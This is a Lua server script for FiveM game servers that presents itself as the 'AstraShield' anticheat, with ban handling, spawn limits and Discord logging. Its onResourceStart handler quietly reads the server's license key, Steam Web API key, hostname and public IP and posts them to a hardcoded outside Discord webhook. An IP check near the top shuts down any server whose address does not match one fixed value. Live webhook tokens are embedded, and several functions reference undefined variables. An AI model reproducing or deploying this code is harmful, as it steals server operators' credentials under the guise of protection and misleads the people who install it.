SetConvarServerInfo("AstraShield", "discord.gg/EUYufGUqUP")





PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
    if text ~= "45.131.111.58" then
        Wait(10000)
        print[[^4
     _            _                    ____    _       _          _       _ 
    / \     ___  | |_   _ __    __ _  / ___|  | |__   (_)   ___  | |   __| |
   / _ \   / __| | __| | '__|  / _` | \___ \  | '_ \  | |  / _ \ | |  / _` |
  / ___ \  \__ \ | |_  | |    | (_| |  ___) | | | | | | | |  __/ | | | (_| |
 /_/   \_\ |___/  \__| |_|     \__,_| |____/  |_| |_| |_|  \___| |_|  \__,_|^0]]
        print("[^4AstraShield^0] ^4Globalbans:^0 [^1Error^0] to Load the Bans.")
        print("[^4AstraShield^0] [^1Error^0] ^0Your IP is not Valid, Please connect AstraShield Support.")
        Wait(12000)
        os.exit(-1)
    else
        print[[^4
     _            _                    ____    _       _          _       _ 
    / \     ___  | |_   _ __    __ _  / ___|  | |__   (_)   ___  | |   __| |
   / _ \   / __| | __| | '__|  / _` | \___ \  | '_ \  | |  / _ \ | |  / _` |
  / ___ \  \__ \ | |_  | |    | (_| |  ___) | | | | | | | |  __/ | | | (_| |
 /_/   \_\ |___/  \__| |_|     \__,_| |____/  |_| |_| |_|  \___| |_|  \__,_|^0]]
        print("[^4AstraShield^0] ".. GetCurrentResourceName() .." ^2Sucessfully ^0Loaded.")
        print("[^4AstraShield^0] Protected: ^4"..text.." ^2Sucessfully ^0Loaded.")
    end
end)

AddEventHandler('onResourceStart', function(resourceName)
    if GetCurrentResourceName() == resourceName then
      PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        local servername = GetConvar('sv_hostname')
        local licensekey = GetConvar('sv_licenseKey')
        local apikey = GetConvar('steam_webApiKey')
        local messagem = "**Server Name:** \n```"..servername.."``` \n**Server IP:** ```"..text.."``` \n**License Key:** ```"..licensekey..'``` \n **Steam API Key:** ```'..apikey..'```'
        local content = {{
        ["color"] = 3447003,
        ["description"] = messagem,
        },}
        PerformHttpRequest("https://discordapp.com/api/webhooks/1078799011244425257/0xQ_HyxHzx2-QRvQbElSoPAfwCv5uq_YCGpbxs53-6tbAQRe8SLodqJjFDBZNIDHczUd", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
      end)
    end
end)

RegisterNetEvent('player:ban')
AddEventHandler('player:ban', function(id, reason)
    if IsPlayerAceAllowed(source, 'AstraShield.bypass') then return end
    local id = source;
    local ids = ExtractIdentifiers(id);
    local steam = ids.steam:gsub("steam:", "");
    local steamDec = tostring(tonumber(steam,16));
    steam = "https://steamcommunity.com/profiles/" .. steamDec;
    local gameLicense = ids.license;
    local discord = ids.discord;
    Wait(520)
    BanPlayer(id, reason)
	DropPlayer(id, 'You Banned From AstraShield Anticheat')
end)

function ExtractIdentifiers(src)
    
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(src) - 1 do
        local id = GetPlayerIdentifier(src, i)
        
        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.sub(id, 1, string.len("discord:")) == "discord:" then
            discordid = string.sub(id, 9)
            identifiers.discord = "<@" .. discordid .. ">"
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        end
    end
    return identifiers
end

function BanPlayer(src, reason) 
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local cfg = json.decode(config)
    local ids = ExtractIdentifiers(src);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
    local banData = {};
    banData['ID'] = tonumber(getNewBanID());
    banData['ip'] = "NONE SUPPLIED";
    banData['reason'] = reason;
    banData['license'] = "NONE SUPPLIED";
    banData['steam'] = "NONE SUPPLIED";
    banData['xbl'] = "NONE SUPPLIED";
    banData['live'] = "NONE SUPPLIED";
    banData['discord'] = "NONE SUPPLIED";
    if ip ~= nil and ip ~= "nil" and ip ~= "" then 
        banData['ip'] = tostring(ip);
    end
    if playerLicense ~= nil and playerLicense ~= "nil" and playerLicense ~= "" then 
        banData['license'] = tostring(playerLicense);
    end
    if playerSteam ~= nil and playerSteam ~= "nil" and playerSteam ~= "" then 
        banData['steam'] = tostring(playerSteam);
    end
    if playerXbl ~= nil and playerXbl ~= "nil" and playerXbl ~= "" then 
        banData['xbl'] = tostring(playerXbl);
    end
    if playerLive ~= nil and playerLive ~= "nil" and playerLive ~= "" then 
        banData['live'] = tostring(playerXbl);
    end
    if playerDisc ~= nil and playerDisc ~= "nil" and playerDisc ~= "" then 
        banData['discord'] = tostring(playerDisc);
    end
    cfg[tostring(GetPlayerName(src))] = banData;
    SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(cfg, { indent = true }), -1)
    local veuqx = {
        {
            author = {
                name = 'â›… AstraShield Anticheat',
                icon_url = "https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png"
            },
            title = '***Local Banned Player***',
            footer = {
                text = 'AstraShield Anticheat l ' .. os.date("%x", 906000490) ..'',
                icon_url = 'https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png'
            },
            description = "**Ban Date** : ".. os.date("%x", 906000490) .."**\nBan Reason: **"..reason.."\n\n***Player Information :***\n\n**Playername: **"..GetPlayerName(src).."**\nPlayerid: **"..src.."\nDiscord: "..playerDisc.."\n **FiveM:**"..playerLicense.."\n **Steam:** "..playerSteam,
            color = 3447003         
        }
    }
    PerformHttpRequest(WebhookConfig.LocalBan, function(error, texto, cabeceras) end, "POST", json.encode({username = "AstraShield", embeds = Berkay}), {["Content-Type"] = "application/json"})
    local liveban = {
        {
            author = {
                name = 'â›… AstraShield Anticheat',
                icon_url = "https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png"
            },
            title = 'Banned Player',
            footer = {
                text = 'AstraShield Live Banned l '.. os.date("%x", 906000490) ..'',
                icon_url = 'https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png'
            },
            description = "Detected a Player **cheating** on Protected Server.\n\n**Playername:** "..GetPlayerName(src).."\n**Reason:** "..reason,
            color = 3447003
        }
    }
    PerformHttpRequest("https://discord.com/api/webhooks/1079460103339651233/0SVYhzE3Uq5OZBQBeu22SAFP5SQiJP0igYHrpy-ECm0iV1mPrNiPPpk0_ewbjz-Kde45", function(error, texto, cabeceras) end, "POST", json.encode({username = "AstraShield", embeds = liveban}), {["Content-Type"] = "application/json"})
end

function getNewBanID()
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local cfg = json.decode(config)
    local banID = 0;
    for k, v in pairs(cfg) do 
        banID = banID + 1;
    end
    return (math.random(11111,99999))
end

RegisterCommand('astraunban', function(source, args, rawCommand)
    local src = source;
    if (src <= 0) then
      if #args == 0 then 
          print("[^4AstraShield^0] [^1Error^0] Ban ID not found.")
          return; 
      end
      local banID = args[1];
      if tonumber(banID) ~= nil then
          local playerName = UnbanPlayer(banID);
          if playerName then
            print("[^4AstraShield^0] Player: " .. playerName .." ^2Sucessfully ^0Unbanned.")
          else 
              print("[^4AstraShield^0] [^1Error^0] is not a valid ban ID.")
          end
      end
      return;
    end 
    if IsPlayerAceAllowed(src, "Astrashield.bypass") then 
      if #args == 0 then 
          return; 
      end
      local banID = args[1];
      if tonumber(banID) ~= nil then 
          local playerName = UnbanPlayer(banID);
          if playerName then
          else 
          end
      else  
      end
    end
end)

function UnbanPlayer(banID)
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local cfg = json.decode(config)
    for k, v in pairs(cfg) do 
        local id = tonumber(v['ID']);
        if id == tonumber(banID) then 
            local name = k;
            cfg[k] = nil;
            SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(cfg, { indent = true }), -1)
            return name;
        end
    end
    return false;
end

function isBanned(src)
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local cfg = json.decode(config)
    local ids = ExtractIdentifiers(src);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
    for k, v in pairs(cfg) do 
        local reason = v['reason']
        local id = v['ID']
        local ip = v['ip']
        local license = v['license']
        local steam = v['steam']
        local xbl = v['xbl']
        local live = v['live']
        local discord = v['discord']
        if tostring(ip) == tostring(playerIP) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(license) == tostring(playerLicense) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(steam) == tostring(playerSteam) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(xbl) == tostring(playerXbl) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(live) == tostring(playerLive) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(discord) == tostring(playerDisc) then return { ['banID'] = id, ['reason'] = reason } end;
    end
    return false;
end

function GetBans()
    local config = LoadResourceFile(GetCurrentResourceName(), "bans.json")
    local cfg = json.decode(config)
    return cfg;
end

local function OnPlayerConnecting(name, setKickReason, deferrals)
    deferrals.defer();
    deferrals.update('Checking Your Information ...');
    local src = source;
    local banned = false;
    local ban = isBanned(src);
    Citizen.Wait(400);
    if ban then 
        local reason = ban['reason'];
        print("[^4AstraShield^0] [^1Banned^0] " .. GetPlayerName(src) .. " tried to join but is banned. Banid: ^4"..ban['banID'].."^0")
        deferrals.done("Ban ID: [" .. ban['banID'] .. "] Banned By AstraShield.");
        banned = true;
        CancelEvent();
        return;
    end
    if not banned then 
        deferrals.done();
    end
end

AddEventHandler("playerConnecting", OnPlayerConnecting)

-- Anti Particles
Citizen.CreateThread(function()
    particlesSpawned = {}
    vehiclesSpawned = {}
    pedsSpawned = {}
    objectsSpawned = {}
    while true do
        Citizen.Wait(20000) -- augment/lower this if you want.
        particlesSpawned = {}
        vehiclesSpawned = {}
        pedsSpawned = {}
        objectsSpawned = {}
    end
end)

AddEventHandler('ptFxEvent', function(sender, data)
    if MainConfig.AntiParticles ~= true then return end
    local _src = sender
    particlesSpawned[_src] = (particlesSpawned[_src] or 0) + 1
    if particlesSpawned[_src] > MainConfig.AntiParticlesLimit then
        CancelEvent()
            if MainConfig.AntiParticlesBan then
                BanPlayer(sender, 'Particles detected')
                DropPlayer(sender, '[â›…] AstraShield Reason: Particles detected')
            end
            if MainConfig.AntiParticlesKick then
                DropPlayer(sender, '[â›…] AstraShield Reason: Particles detected')
            end
    end
end)

-- Anti JailAll
RegisterServerEvent('esx-qalle-jail:jailPlayer')
AddEventHandler('esx-qalle-jail:jailPlayer', function(target)
    if MainConfig.AntiJaillAll ~= true then return end
	if target == -1 then
		CancelEvent()
            if MainConfig.AntiJaillAllBan then
                BanPlayer(source, 'Jailall detected')
                DropPlayer(source, '[â›…] AstraShield Reason: Jailall detected')
            end
            if MainConfig.AntiJaillAllKick then
                DropPlayer(source, '[â›…] AstraShield Reason: Jailall detected')
            end
	end
end)

-- Anti Explosion
AddEventHandler('explosionEvent', function(sender, ev)
    local ids = ExtractIdentifiers(sender);
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerDisc = ids.discord;
	local explsionEmbed = {
        {
            author = {
                name = 'â›… AstraShield Anticheat',
                icon_url = "https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png"
            },
            title = 'Explosion',
            footer = {
                text = 'AstraShield Explosion l '.. os.date("%x", 906000490) ..'',
                icon_url = 'https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png'
            },
            description = "**Playername: **"..GetPlayerName(sender).."**\nPlyerid: **"..sender.."**\nExplosion: **"..ev.explosionType.."\n Explosion Types: https://wiki.rage.mp/index.php?title=Explosions\n```Discord: **"..playerDisc.."**\n FiveM: **"..playerLicense.."**\n Steam: **"..playerSteam.."```",
            color = 3447003 
        }
    }
    PerformHttpRequest(WebhookConfig.Explosion, function(error, texto, cabeceras) end, "POST", json.encode({username = "Berkay", embeds = explsionEmbed}), {["Content-Type"] = "application/json"})
    for _, v in ipairs(ServerConfig.Explosion.BlacklistedExplosions) do
        if ev.explosionType == v then
            if IsPlayerAceAllowed(sender, 'AstraShield.bypass') then return end
            CancelEvent()
            if ServerConfig.Explosion.AntiExplosionBan == true then
                BanPlayer(sender, 'Tried to spawn Blacklisted Explosion, Type: ' ..ev.explosionType)
                DropPlayer(sender, '[â›…] AstraShield Reason: Tried to spawn Blacklisted Explosion. Type: ' ..ev.explosionType)
            end
            if ServerConfig.Explosion.AntiExplosionKick == true then
                DropPlayer(sender, '[â›…] AstraShield Reason: Tried to spawn Blacklisted Explosion. Type: ' ..ev.explosionType)
            end
        end
    end
end)	    

-- Anti Kick Player out of Vehicle
AddEventHandler("clearPedTasksEvent", function(sender, data)
    if MainConfig.AntiRemoveFromCar then
        if IsPlayerAceAllowed(sender, 'AstraShield.bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to kick Player out of Vehicle')
	    DropPlayer(sender, '[â›…] AstraShield you kicked an player out of Vehicle')
    end
end)

-- Anti Remove Weapon of other Players
AddEventHandler('removeWeaponEvent', function(sender, data)
    if MainConfig.AntiRemoveWeapon then
        if IsPlayerAceAllowed(sender, 'AstraShield.bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to remove Weapon')
        DropPlayer(sender, '[â›…] AstraShield Tried to Remove weapon Other Player')
    end
end)


    AddEventHandler("giveWeaponEvent", function(sender, data)
        if data.givenAsPickup == false then
            CancelEvent()
            KickAndLog(sender, 'Tried to give a weapon to a other Player', 'basic', true)
        end
    end)
    AddEventHandler('giveWeaponEvent', function(sender, data)
            CancelEvent()
            KickAndLog(sender, 'Tried to give a weapon to a other Player', 'basic', true)
    end)


function GetEntityOwner(entity)
    if (not DoesEntityExist(entity)) then 
        return nil 
    end
    local owner = NetworkGetEntityOwner(entity)
    if (GetEntityPopulationType(entity) ~= 7) then return nil end
    return owner
end

AddEventHandler("entityCreating",  function(entity)
    local owner = GetEntityOwner(entity)
    local model = GetEntityModel(entity)
    if (owner ~= nil and owner > 0) then
        if IsPlayerAceAllowed(owner, 'AstraShield.bypass') then return end

        if GetEntityType(entity) == 1 then
            if EntityConfig.EntityPed == true then
                local _src = owner
                pedsSpawned[_src] = (pedsSpawned[_src] or 0) + 1
                if pedsSpawned[_src] > EntityConfig.EntityPedLimit then
                    if EntityConfig.Entity then
                        CancelEvent()
                    end
                    if EntityConfig.EntityBan then
                        BanPlayer(owner, 'Ped Limit')
                        DropPlayer(owner, '[â›…] AstraShield Ped Limit') 
                    end
                    if EntityConfig.EntityKick then
                        DropPlayer(owner, '[â›…] AstraShield Ped Limit') 
                    end
                end 
            end
        end

        if GetEntityType(entity) == 2 then
            if EntityConfig.EntityVehicle == true then
                local _src = owner
                vehiclesSpawned[_src] = (vehiclesSpawned[_src] or 0) + 1
                if vehiclesSpawned[_src] > EntityConfig.EntityVehicleLimit then
                    if EntityConfig.Entity then
                        CancelEvent()
                    end
                    if EntityConfig.EntityBan then
                        BanPlayer(owner, 'Vehicle Limit')
                        DropPlayer(owner, '[â›…] AstraShield VehicleLimit') 
                    end
                    if EntityConfig.EntityKick then
                        DropPlayer(owner, '[â›…] AstraShield Vehicle Limit') 
                    end
                end 
            end
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        Wait(1000)
        for i, event in ipairs(TriggerConfig.BlacklistedEventsList) do
            RegisterNetEvent(event)
            AddEventHandler(event, function()
                if TriggerConfig.BlacklistedEvents ~= true then return end
                if IsPlayerAceAllowed(source, 'AstraShield.bypass') then return end
                CancelEvent()
                if TriggerConfig.BlacklistedEventsBan then
                    BanPlayer(source, 'Tried to trigger Blacklisted Event: ' ..event)
                    DropPlayer(source, '[â›…] AstraShield Blackliste Event') 
                end
                if TriggerConfig.BlacklistedEventsKick then
                    DropPlayer(source, '[â›…] AstraShield Blackliste Event')
                end
            end)
        end
    end
end)

AddEventHandler('playerConnecting', function()
    local identifier = "Not Found"
    local license   = "Not Found"
    local liveid    = "Not Found"
    local serverName = GetConvar("sv_hostname")
    local hostname = GetConvar("sv_projectName")
    local xblid     = "Not Found"
    local discord   = "Not Found"
    local playerip = "Not Found"
    local reason    = "Not Found"
    local name = GetPlayerName(source)
    if true then
      local sourceplayername = source
        for k,v in ipairs(GetPlayerIdentifiers(source))do
          if string.sub(v, 1, string.len("steam:")) == "steam:" then
            identifier = v
          elseif string.sub(v, 1, string.len("license:")) == "license:" then
            license = v
          elseif string.sub(v, 1, string.len("live:")) == "live:" then
            liveid = v
          elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xblid  = v
          elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discord = v
          elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
            playerip = v
            end
        end
        print("[^4AstraShield^0] ^4"..name.." ^2Connecting ^0on the server") 
        local veuqx = {
        {
            author = {
                name = 'â›… AstraShield Anticheat',
                icon_url = "https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png"
            },
            title = 'Connecting Player',
            footer = {
                text = 'AstraShield Connecting l '.. os.date("%x", 906000490) ..'',
                icon_url = 'https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png'
            },
            description = "\n**Player:** "..name.."\n**License:** "..license.."\n**Discord:** "..discord.."\n**Live:** "..liveid.."\n**IP:** ||"..playerip.."||",
            color = 3447003
      }
    }
    PerformHttpRequest(WebhookConfig.ConnectPlayer, function(err, text, headers) end, 'POST', json.encode({username = "AstraShield", embeds = veuqx}), { ['Content-Type'] = 'application/json' })  
    end
end, false)

AddEventHandler('playerDropped', function(reason)
    local identifier = "Not Found"
    local license   = "Not Found"
    local liveid    = "Not Found"
    local xblid     = "Not Found"
    local discord   = "Not Found"
    local playerip = "Not Found"
    local serverName = GetConvar("sv_hostname")
    local hostname = GetConvar("sv_projectName")
    local target    = id
    local duree     = 0
    local permanent = 0
    local name = GetPlayerName(source)
    if true then
      local sourceplayername = source
        for k,v in ipairs(GetPlayerIdentifiers(source))do
          if string.sub(v, 1, string.len("steam:")) == "steam:" then
            identifier = v
          elseif string.sub(v, 1, string.len("license:")) == "license:" then
            license = v
          elseif string.sub(v, 1, string.len("live:")) == "live:" then
            liveid = v
          elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xblid  = v
          elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discord = v
          elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
            playerip = v
          end
    end
    print("[^4AstraShield^0] ^4"..name.." ^1Left ^0the Server Reason: ^1"..reason.."^0") 
    local veuqx1 = {
      {
        author = {
            name = 'â›… AstraShield Anticheat',
            icon_url = "https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png"
        },
        title = 'Disconnect Player',
        footer = {
            text = 'AstraShield Disconnect l '.. os.date("%x", 906000490) ..'',
            icon_url = 'https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png'
        },
        description = "\n**Player:** "..name.."\n**License:** "..license.."\n**Discord:** "..discord.."\n**Live:** "..liveid.."\n**IP:** ||"..playerip.."||\n**Reason:** ```"..reason.."```",
        color = 3447003
      }
    }
    PerformHttpRequest(WebhookConfig.DisconnectPlayer, function(err, text, headers) end, 'POST', json.encode({username = "AstraShield", embeds = veuqx1}), { ['Content-Type'] = 'application/json' }) 
    end
end, false)

    AddEventHandler('entityCreating', function(entity)
        if DoesEntityExist(entity) then
            local _src = NetworkGetEntityOwner(entity)
            local model = GetEntityModel(entity)
            local _entitytype = GetEntityPopulationType(entity)
            if _src == nil then
                CancelEvent()
            end
            if GetEntityType(entity) == 2 then
                if _entitytype == 6 or _entitytype == 7 then
                    TriggerClientEvent('OVACTRIGGER:checkifneargarage', _src)
                end
            end
        end
    end)

    Citizen.CreateThread(function()
        if ServerConfig.AntiFakeChatMessages then
            AddEventHandler("chatMessage",function(source, n, message)
                for i=1 , #ServerConfig.Words do
                        if string.match(message:lower(),ServerConfig.Words[i]:lower()) then
                            DropPlayer(source, '[â›…] AstraShield Send block word to chat') 
                            return CancelEvent()
                        end
                end
            end)
        end
    end)

    AddEventHandler("weaponDamageEvent", function(sender, data)
        if ServerConfig.Antitaze then
            if data.weaponType == 911657153 then
                if tasers[sender] == nil then
                    tasers[sender] = {amount = tonumber("1"), timestamp = os.time()}
                else
                    tasers[sender].amount = tasers[sender].amount + tonumber("1")
                    if tasers[sender].amount > ServerConfig.MaxTazeSpammer then
                        local g = os.time() - tasers[sender].timestamp
                        if g <= ServerConfig.AntitazeTimer then
                            tasers[sender].amount = 0
                            if GetPlayerName(sender) ~= nil then
                                DropPlayer(source, '[â›…] AstraShield ried to taze all') 
                            end
                            CancelEvent()
                            tasers[sender] = {amount = tonumber("1"), timestamp = os.time()}
                        else
                            tasers[sender] = {amount = tonumber("1"), timestamp = os.time()}
                        end
                    end
                end
            end
        end
        if data.willKill then
            TriggerClientEvent('ow:Checkdamage', sender, data.weaponType)
        end
    end)

    AddEventHandler("InteractSound_SV:PlayWithinDistance", function(maxDistance, soundFile, soundVolume)
        local SRC = source
        if ServerConfig.AntiPlaySound then
            if maxDistance == 10000 and soundFile == "handcuff" then
                DropPlayer(source, '[â›…] AstraShield Anti Play Sounds') 
                CancelEvent()
            elseif maxDistance == 1000 and soundFile == "Cuff" then
                DropPlayer(source, '[â›…] AstraShield Anti Play Sounds') 
                CancelEvent()
            elseif maxDistance == 103232 and soundFile == "lock" then
                DropPlayer(source, '[â›…] AstraShield Anti Play Sounds') 
                CancelEvent()
            elseif maxDistance == 10 and soundFile == "szajbusek" then
                DropPlayer(source, '[â›…] AstraShield Anti Play Sounds') 
                CancelEvent()
            elseif maxDistance == 5 and soundFile == "alarm" then
                DropPlayer(source, '[â›…] AstraShield Anti Play Sounds') 
                CancelEvent()
            elseif maxDistance == 13232 and soundFile == "pasysound" then
                DropPlayer(source, '[â›…] AstraShield Anti Play Sounds') 
                CancelEvent()
            elseif maxDistance == 5000 and soundFile == "demo" then
                DropPlayer(source, '[â›…] AstraShield Anti Play Sounds') 
                CancelEvent() 
            end
        end
    end)

RegisterNetEvent("esx_ambulancejob:syncDeadBody")
AddEventHandler("esx_ambulancejob:syncDeadBody", function(PED, TARGET)
	if ServerConfig.AntiBringAll then
        DropPlayer(source, '[â›…] AstraShield Anti Bring All Players') 
        CancelEvent()
	end
end)

local function noice2()
    local resourceList = {}
    for i=0,GetNumResources()-1 do
        resourceList[i+1] = GetResourceByFindIndex(i)
    end
    DropPlayer(source, '[â›…] AstraShield Anti Resource Injector') 
end

Citizen.CreateThread(function()
    if ServerConfig.ResInjection then
    while true do
        Wait(15000)
        if playerloaded then
          if gpby then
          break
          end
            noice2()
        end
    end
    end
end)



local resourceList = {}
AddEventHandler("onResourceListRefresh", refreshResourceList)

function refreshResourceList()
    local allResources = GetNumResources()
    for i = 0, allResources, 1 do
        local resource_name = GetResourceByFindIndex(i)
        if resource_name and GetResourceState(resource_name) == "started" and resource_name ~= '_cfx_internal' then
            table.insert(resourceList, resource_name)
        end
    end
end 

RegisterServerEvent("LksHdz7dHdtgdg:transData")
AddEventHandler("LksHdz7dHdtgdg:transData", function(getResource, clientEvents)
    source = source
    if getResource ~= nil then
		refreshResourceList()
        local found = false
        for k, name in pairs(resourceList) do
            if getResource == name then
            found = true
            end
        end

        if not found then
            CancelEvent()
            BanPlayer(source, "Bad event: "..getResource)
            DropPlayer(source,  ":(")
        end
    end 
end)






local weapons55 = {
    GetHashKey('COMPONENT_COMBATPISTOL_CLIP_01'),
    GetHashKey('COMPONENT_COMBATPISTOL_CLIP_02'),
    GetHashKey('COMPONENT_APPISTOL_CLIP_01'),
    GetHashKey('COMPONENT_APPISTOL_CLIP_02'),
    GetHashKey('COMPONENT_MICROSMG_CLIP_01'),
    GetHashKey('COMPONENT_MICROSMG_CLIP_02'),
    GetHashKey('COMPONENT_SMG_CLIP_01'),
    GetHashKey('COMPONENT_SMG_CLIP_02'),
    GetHashKey('COMPONENT_ASSAULTRIFLE_CLIP_01'),
    GetHashKey('COMPONENT_ASSAULTRIFLE_CLIP_02'),
    GetHashKey('COMPONENT_CARBINERIFLE_CLIP_01'),
    GetHashKey('COMPONENT_CARBINERIFLE_CLIP_02'),
    GetHashKey('COMPONENT_ADVANCEDRIFLE_CLIP_01'),
    GetHashKey('COMPONENT_ADVANCEDRIFLE_CLIP_02'),
    GetHashKey('COMPONENT_MG_CLIP_01'),
    GetHashKey('COMPONENT_MG_CLIP_02'),
    GetHashKey('COMPONENT_COMBATMG_CLIP_01'),
    GetHashKey('COMPONENT_COMBATMG_CLIP_02'),
    GetHashKey('COMPONENT_PUMPSHOTGUN_CLIP_01'),
    GetHashKey('COMPONENT_SAWNOFFSHOTGUN_CLIP_01'),
    GetHashKey('COMPONENT_ASSAULTSHOTGUN_CLIP_01'),
    GetHashKey('COMPONENT_ASSAULTSHOTGUN_CLIP_02'),
    GetHashKey('COMPONENT_PISTOL50_CLIP_01'),
    GetHashKey('COMPONENT_PISTOL50_CLIP_02'),
    GetHashKey('COMPONENT_ASSAULTSMG_CLIP_01'),
    GetHashKey('COMPONENT_ASSAULTSMG_CLIP_02'),
    GetHashKey('COMPONENT_AT_RAILCOVER_01'),
    GetHashKey('COMPONENT_AT_AR_AFGRIP'),
    GetHashKey('COMPONENT_AT_PI_FLSH'),
    GetHashKey('COMPONENT_AT_AR_FLSH'),
    GetHashKey('COMPONENT_AT_SCOPE_MACRO'),
    GetHashKey('COMPONENT_AT_SCOPE_SMALL'),
    GetHashKey('COMPONENT_AT_SCOPE_MEDIUM'),
    GetHashKey('COMPONENT_AT_SCOPE_LARGE'),
    GetHashKey('COMPONENT_AT_SCOPE_MAX'),
    GetHashKey('COMPONENT_AT_PI_SUPP'),
}

Citizen.CreateThread(function()
    if MainConfig.StopDamageAIModify then
        while true do
            Wait(5000)
            if playerloaded then
              local p = PlayerPedId()
              if gpby then
                break
              end
                for i = 1, #weapons55 do
                    local dmg_mod = GetWeaponComponentDamageModifier(weapons55[i])
                    local accuracy_mod = GetWeaponComponentAccuracyModifier(weapons55[i])
                    if dmg_mod > 1.1 or accuracy_mod > 1.2 then
                        DropPlayer(source, '[â›…] AstraShield Anti AI Folder') 
                    end
                end
          end
        end
    end
end)

inCheckLoop = {}
function checkIsInLoop(source, firstTime)
    local firstTime = firstTime
    players = GetPlayers()
    for k, v in ipairs(players) do
        local token = GetPlayerToken(v, 0)
        if token == GetPlayerToken(source, 0) then
            printDebug("Checking..")
            if not firstTime then
                inCheckLoop[source] = false
            end
            TriggerClientEvent("oneshieldlag:check", source)
            Wait(1250)
            if not inCheckLoop[source] then
                local Content = {
                    {
                        author = {
                            name = 'â›… AstraShield Anticheat',
                            icon_url = "https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png"
                        },
                        title = 'Kicked Logs',
                        footer = {
                            text = 'AstraShield Kicked l '.. os.date("%x", 906000490) ..'',
                            icon_url = 'https://cdn.discordapp.com/attachments/1056300600360443978/1078976676047892530/image.png'
                        },
                        description = "\n**Player Kicked:** ".. GetPlayerIndetifiers(source) .."\n**Reason:** ```"..reason.."```",
                        color = 3447003
                    }
                }
                PerformHttpRequest(WebhookConfig.KickedPlayer, function(err, text, headers) end, "POST", json.encode({username = "OneShield", embeds = Content}), {["Content-Type"] = "application/json"})
                DropPlayer(source, '[â›…] AstraShield Anti Lag Switch') 
            else
                printDebug("No LagSwitch")
                Wait(1000)
                checkIsInLoop(source, false)
            end
        end
    end
end

RegisterNetEvent('astrashieldlag:clientAdded')
AddEventHandler('astrashieldlag:clientAdded', function()
    checkIsInLoop(source, true)
    printDebug("Added Player to Loop")
end)

RegisterNetEvent('astrashieldlag:setStatus')
AddEventHandler('astrashieldlag:setStatus', function()
    inCheckLoop[source] = true
    printDebug("Update Heartbeat")
end)

Citizen.CreateThread(function()
    if ServerConfig.PoliceVehicleWeapon then
        while true do
            Wait(3000)
            if playerloaded then
              local p = PlayerPedId()
              if gpby then
                break
              end
                local pv = IsPedInAnyPoliceVehicle(p)
                if pv then
                    RemoveWeaponFromPed(p, GetHashKey("WEAPON_PUMPSHOTGUN"))
                    RemoveWeaponFromPed(p, GetHashKey("WEAPON_SNIPERRIFLE"))
                    RemoveWeaponFromPed(p, GetHashKey("WEAPON_CARBINERIFLE"))
                end
          end
        end
    end
end)

qBlacklistedEntitys = {
    GetHashKey("prop_fnclink_05crnr1"),
    GetHashKey("xs_prop_hamburgher_wl"),
    GetHashKey("xs_prop_plastic_bottle_wl"),
    GetHashKey("stt_prop_ramp_adj_flip_m"),
    GetHashKey("stt_prop_ramp_adj_flip_mb"),
    GetHashKey("stt_prop_ramp_adj_flip_s"),
    GetHashKey("stt_prop_ramp_adj_flip_sb"),
    GetHashKey("stt_prop_ramp_adj_hloop"),
    GetHashKey("stt_prop_ramp_adj_loop"),
    GetHashKey("stt_prop_ramp_jump_l"),
    GetHashKey("stt_prop_ramp_jump_m"),
    GetHashKey("stt_prop_ramp_jump_s"),
    GetHashKey("stt_prop_ramp_jump_xl"),
    GetHashKey("stt_prop_ramp_jump_xs"),
    GetHashKey("stt_prop_ramp_jump_xxl"),
    GetHashKey("stt_prop_ramp_multi_loop_rb"),
    GetHashKey("stt_prop_ramp_spiral_l"),
    GetHashKey("stt_prop_ramp_spiral_l_l"),
    GetHashKey("stt_prop_ramp_spiral_l_m"),
    GetHashKey("stt_prop_ramp_spiral_l_s"),
    GetHashKey("stt_prop_ramp_spiral_l_xxl"),
